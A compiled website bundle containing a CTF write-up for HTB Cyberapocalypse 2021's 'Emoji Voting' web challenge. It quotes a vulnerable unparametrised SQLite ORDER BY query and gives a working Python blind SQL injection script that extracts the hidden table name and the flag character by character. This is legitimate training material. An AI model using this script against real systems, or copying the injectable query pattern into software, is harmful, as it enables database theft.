"use strict";(self.webpackChunkmy_website=self.webpackChunkmy_website||[]).push([[3486],{2099:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>c,contentTitle:()=>l,default:()=>f,frontMatter:()=>r,metadata:()=>s,toc:()=>h});var a=t(4848),i=t(8453),o=t(2714);const r={slug:"emoji-voting-cyberapocalypse-2021-ctf",title:"Emoji Voting - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Emoji voting challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},l=void 0,s={permalink:"/blog/emoji-voting-cyberapocalypse-2021-ctf",source:"@site/blog/2021-04-28-20:40:26emoji-voting-cyberapocalypse-2021-ctf.md",title:"Emoji Voting - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Emoji voting challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",date:"2021-04-28T00:00:00.000Z",formattedDate:"April 28, 2021",tags:[{label:"Cyber Security",permalink:"/blog/tags/cyber-security"},{label:"CTF",permalink:"/blog/tags/ctf"}],readingTime:5.635,hasTruncateMarker:!0,authors:[{name:"Kiril Panayotov Blagoev",title:"Admin",url:"https://github.com/tihawk",imageURL:"https://github.com/tihawk.png",key:"kiroki"}],frontMatter:{slug:"emoji-voting-cyberapocalypse-2021-ctf",title:"Emoji Voting - Cyberapocalypse 2021 CTF",description:"This is a writeup for the Emoji voting challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web.",authors:"kiroki",tags:["Cyber Security","CTF"]},unlisted:!1,prevItem:{title:"Nintendo Base64 - Cyberapocalypse 2021 CTF",permalink:"/blog/nintendo-base64-cyberapocalypse-2021-ctf"},nextItem:{title:"Soulcrabber - Cyberapocalypse 2021 CTF",permalink:"/blog/soulcrabber-cyberapocalypse-2021-ctf"}},c={authorsImageUrls:[void 0]},h=[{value:"Prompt",id:"prompt",level:2},{value:"Recon",id:"recon",level:2},{value:"What&#39;s vulnerable?",id:"whats-vulnerable",level:3},{value:"Where&#39;s the flag?",id:"wheres-the-flag",level:3},{value:"Analysis",id:"analysis",level:2},{value:"Attack vector",id:"attack-vector",level:3},{value:"What we need to find",id:"what-we-need-to-find",level:3},{value:"Solution",id:"solution",level:2}];function d(e){const n={blockquote:"blockquote",code:"code",h2:"h2",h3:"h3",li:"li",ol:"ol",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.p,{children:"This is a writeup for the Emoji voting challenge, part of the Hack the box's Cyberapocalypse CTF 2021, category Web."}),"\n",(0,a.jsx)(n.h2,{id:"prompt",children:"Prompt"}),"\n",(0,a.jsx)(n.p,{children:"A place to vote your favourite and least favourite puny human emojis!"}),"\n",(0,a.jsx)(n.h2,{id:"recon",children:"Recon"}),"\n",(0,a.jsx)(n.p,{children:"For this challenge, we are given the source code. We notice, that the technologies of interest in the back-end are nodejs running an express server, and sqlite for a database."}),"\n",(0,a.jsx)(n.h3,{id:"whats-vulnerable",children:"What's vulnerable?"}),"\n",(0,a.jsxs)(n.p,{children:["After some poking around, we find that the most useful file for us is  ",(0,a.jsx)(n.code,{children:"database.js"}),". In it we find two functions for getting access to the database, and one in particular stands out."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-js",children:"async getEmojis(order) {\n        // TOOD: add parametrization\n        return new Promise(async (resolve, reject) => {\n            try {\n                let query = `SELECT * FROM emojis ORDER BY ${ order }`;\n                console.log(query)\n                resolve(await this.db.all(query));\n            } catch(e) {\n                console.log(e)\n                reject(e);\n            }\n        });\n    }\n"})}),"\n",(0,a.jsx)(n.p,{children:"As the comment in the code suggests, there's no parametrisation in building the query, and so it might be subject to some form of injection."}),"\n",(0,a.jsx)(n.h3,{id:"wheres-the-flag",children:"Where's the flag?"}),"\n",(0,a.jsxs)(n.p,{children:["After looking around a bit more, we find that the database consists of two tables - one for storing the emojis, but also one which holds the flag. The one with the flag has a name, which starts with ",(0,a.jsx)(n.code,{children:"flag_"}),", but the second part of the name is 5 random bytes in hex (so 10 characters)."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-js",children:"async migrate() {\n  let rand = crypto.randomBytes(5).toString('hex');\n\n  return this.db.exec(`\n    DROP TABLE IF EXISTS emojis;\n    DROP TABLE IF EXISTS flag_${ rand };\n\n    CREATE TABLE IF NOT EXISTS flag_${ rand } (\n    flag TEXT NOT NULL\n    );\n\n    INSERT INTO flag_${ rand } (flag) VALUES ('CHTB{f4k3_fl4g_f0r_t3st1ng}');\n\n    CREATE TABLE IF NOT EXISTS emojis (\n    id      INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,\n    emoji   VARCHAR(255),\n    name    VARCHAR(255),\n    count   INTEGERT\n    );\n\n    INSERT INTO emojis (emoji, name, count) VALUES \n    ('\ud83d\udc7d', 'alien', 13),\n    ('\ud83d\udef8', 'flying saucer', 3),\n    ('\ud83d\udc7e', 'alien monster', 0),\n    ('\ud83d\udca9', '\ud83d\udc47 = human', 118),\n    ('\ud83d\udebd', '\ud83d\udc47 = human', 19),\n    ('\ud83e\udea0', '\ud83d\udc47 = human', 2),\n    ('\ud83c\udf46', 'eggplant', 69),\n    ('\ud83c\udf51', 'peach', 40),\n    ('\ud83c\udf4c', 'banana', 21),\n    ('\ud83d\udc36', 'dog', 80),\n    ('\ud83d\udc37', 'pig', 37),\n    ('\ud83d\udc68', 'homo idiotus', 124)\n  `);\n}\n"})}),"\n",(0,a.jsx)(n.h2,{id:"analysis",children:"Analysis"}),"\n",(0,a.jsx)(n.h3,{id:"attack-vector",children:"Attack vector"}),"\n",(0,a.jsxs)(n.p,{children:["We might have our place of attack, but we have a problem. It seems that we're only allowed to inject into the ",(0,a.jsx)(n.code,{children:"ORDER BY"})," clause of the select statement."]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-js",children:"let query = `SELECT * FROM emojis ORDER BY ${ order }`;\n"})}),"\n",(0,a.jsx)(n.p,{children:"And this is not that easy. SQL doesn't accept UNION, WHERE, OR or AND clauses in the ORDER BY clause, so we need to use a nested query inside of it."}),"\n",(0,a.jsx)(n.p,{children:"Not only that, but the only result that we can expect back is a change in the ordering of our emojis."}),"\n",(0,a.jsx)(n.h3,{id:"what-we-need-to-find",children:"What we need to find"}),"\n",(0,a.jsx)(n.p,{children:"We need the flag of course. But the flag is stored as an entry inside of a table we don't know the name of."}),"\n",(0,a.jsx)(n.p,{children:"And since we can only inject into an ORDER BY clause, we can't get the name of the table (or the value of the flag for that matter) directly, but have to guess it letter by letter."}),"\n",(0,a.jsxs)(n.p,{children:["Let's build an example. Say we want to check if the 5th symbol of the table name is indeed ",(0,a.jsx)(n.code,{children:"_"})," as in ",(0,a.jsx)(n.code,{children:"flag_"}),". That would be ",(0,a.jsx)(n.code,{children:"5F"})," in hex. We can do this like so"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sql",children:"SELECT * FROM emojis\nORDER BY\n\t(CASE\n    \t(SELECT HEX(SUBSTR(tbl_name, 5, 1)) from \n        \t(SELECT tbl_name FROM sqlite_master\n            \tWHERE type='table' and tbl_name like 'flag%'))\n     WHEN '5F' THEN name ELSE count END) DESC\n"})}),"\n",(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsxs)(n.p,{children:["Note: sqlite can't turn symbols into ASCII codes, so we have to use HEX instead. Also, HEX only matches hexes with no prefix (like ",(0,a.jsx)(n.code,{children:"0x"}),"), and only with capital letters (like ",(0,a.jsx)(n.code,{children:"D4"}),")."]}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["The statement above will return the emojis in descending order by ",(0,a.jsx)(n.code,{children:"name"})," if the fifth symbol is ",(0,a.jsx)(n.code,{children:"_"}),", or ordered by ",(0,a.jsx)(n.code,{children:"count"})," if the 5th symbol isn't an underscore."]}),"\n",(0,a.jsx)(n.h2,{id:"solution",children:"Solution"}),"\n",(0,a.jsx)(n.p,{children:"With our example in mind, let's build a script which will get the table name with the flag in it. We need to"}),"\n",(0,a.jsxs)(n.ol,{children:["\n",(0,a.jsx)(n.li,{children:"Build a dictionary of printable symbols in hex"}),"\n",(0,a.jsx)(n.li,{children:"For each position in the name of the table, iterate through our dicitonary of symbols"}),"\n",(0,a.jsx)(n.li,{children:"If the order of the emojis corresponds to a True statement, record that symbol as part of the table name"}),"\n",(0,a.jsxs)(n.li,{children:["Rinse and repeat until we reach the length of the table name (which we know is ",(0,a.jsx)(n.code,{children:"flag_ + 10 ASCII symbols (5bytes in hex)"}),"."]}),"\n"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/env python3\n\nimport requests\nimport string\n\nurl = 'http://138.68.179.198:32342/api/list'\n\nlistOfPrintable = list(string.printable)\nlistOfHexies = []\nfor char in listOfPrintable:\n  listOfHexies.append(format(ord(char), 'x').upper())\ndictie = dict(zip(listOfHexies, listOfPrintable))\n\ndef findTableName():\n  tableNameLen = 15\n  tableName = 'flag_'\n  lookForCharOfIndex = 6\n\n  while lookForCharOfIndex <= tableNameLen:\n\n    for hexie in listOfHexies:\n      data = {\"order\":f\"(CASE (SELECT HEX(SUBSTR(tbl_name, {lookForCharOfIndex}, 1)) from (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name like 'flag%') ) WHEN '{hexie}' THEN name ELSE count END) DESC--\"}\n\n      r = requests.post(url, data=data)\n\n      check = '\"id\":4' in r.text[0:10]\n      if check == True:\n        tableName += dictie[hexie]\n        lookForCharOfIndex += 1\n        print (tableName)\n\n  return tableName\n\ntableName = findTableName()\n"})}),"\n",(0,a.jsx)(n.p,{children:"This will spit out the name of the flag table for us, which in this case was"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sh",children:"flag_5ba432deb9\n"})}),"\n",(0,a.jsx)(n.p,{children:"Next, we repeat the same process for the flag inside of that table, but we slightly modify our statement, to look for characters inside the flag entry, instead of the table name. This one actually ends up being easier to set up."}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-js",children:'data = {\n    "order":f"""(CASE \n    (SELECT HEX(SUBSTR(flag, {lookForCharOfIndex}, 1)) from\n    {foundTbaleName} ) WHEN \'{hexie}\' THEN name ELSE count END) DESC--"""\n}\n'})}),"\n",(0,a.jsxs)(n.p,{children:["And so, we can build and add our ",(0,a.jsx)(n.code,{children:"getFlag"})," function into our script. The whole thing looks like so:"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-python",children:"#!/usr/bin/env python3\n\nimport requests\nimport string\n\nurl = 'http://138.68.179.198:32342/api/list'\n\nlistOfPrintable = list(string.printable)\nlistOfHexies = []\nfor char in listOfPrintable:\n  listOfHexies.append(format(ord(char), 'x').upper())\ndictie = dict(zip(listOfHexies, listOfPrintable))\n\ndef findTableName():\n  tableNameLen = 15\n  tableName = 'flag_'\n  lookForCharOfIndex = 6\n\n  while lookForCharOfIndex <= tableNameLen:\n\n    for hexie in listOfHexies:\n      data = {\"order\":f\"(CASE (SELECT HEX(SUBSTR(tbl_name, {lookForCharOfIndex}, 1)) from (SELECT tbl_name FROM sqlite_master WHERE type='table' and tbl_name like 'flag%') ) WHEN '{hexie}' THEN name ELSE count END) DESC--\"}\n\n      r = requests.post(url, data=data)\n\n      check = '\"id\":4' in r.text[0:10]\n      if check == True:\n        tableName += dictie[hexie]\n        lookForCharOfIndex += 1\n        print (tableName)\n\n  return tableName\n\ndef getFlag(foundTbaleName):\n  flag = 'CHTB{'\n  lookForCharOfIndex = 6\n\n  while True:\n    foundLast = '{'\n    for hexie in listOfHexies:\n      data = {\"order\":f\"(CASE (SELECT HEX(SUBSTR(flag, {lookForCharOfIndex}, 1)) from {foundTbaleName} ) WHEN '{hexie}' THEN name ELSE count END) DESC--\"} # look for FLAG!\n\n      r = requests.post(url, data=data)\n      check = '\"id\":4' in r.text[0:10]\n      if check == True:\n        foundLast = dictie[hexie]\n        flag += dictie[hexie]\n        lookForCharOfIndex += 1\n        print (flag)\n    if foundLast == '}':\n      break\n\ntableName = findTableName()\ngetFlag(tableName)\n"})}),"\n",(0,a.jsx)(n.p,{children:"Which will spit out our flag"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-sh",children:"CHTB{order_me_this_juicy_info}\n"})}),"\n","\n","\n",(0,a.jsx)(o.A,{})]})}function f(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(d,{...e})}):d(e)}},2714:(e,n,t)=>{t.d(n,{A:()=>o});t(6540);const a={"donate-card":"donate-card_mbts",bmac:"bmac_qmhE"};var i=t(4848);function o(){return(0,i.jsx)("div",{className:"alert alert--primary",role:"alert",children:(0,i.jsxs)("div",{className:"card__body",children:[(0,i.jsx)("p",{children:"Thank you for reading!"}),(0,i.jsx)("p",{children:"The information in this blog, as well as all the tools, apps and libraries I develop are currently open source."}),(0,i.jsx)("p",{children:"I would love to keep it this way, and you can help!"}),(0,i.jsx)("p",{children:"You can buy me a coffee from here, which will go towards the next all-nighter I pull off!"}),(0,i.jsx)("a",{href:"https://www.buymeacoffee.com/kblagoev",target:"_blank",children:(0,i.jsx)("img",{src:"https://cdn.buymeacoffee.com/buttons/v2/default-violet.png",className:a.bmac,alt:"Buy Me A Coffee"})}),(0,i.jsxs)("p",{children:["Or you can support me and my code monthly over at ",(0,i.jsx)("a",{href:"https://github.com/sponsors/tihawk",target:"_blank",children:"Github Sponsors!"})]}),(0,i.jsx)("p",{children:"Thanks!"})]})})}},8453:(e,n,t)=>{t.d(n,{R:()=>r,x:()=>l});var a=t(6540);const i={},o=a.createContext(i);function r(e){const n=a.useContext(o);return a.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function l(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(i):e.components||i:r(e.components),a.createElement(o.Provider,{value:n},e.children)}}}]);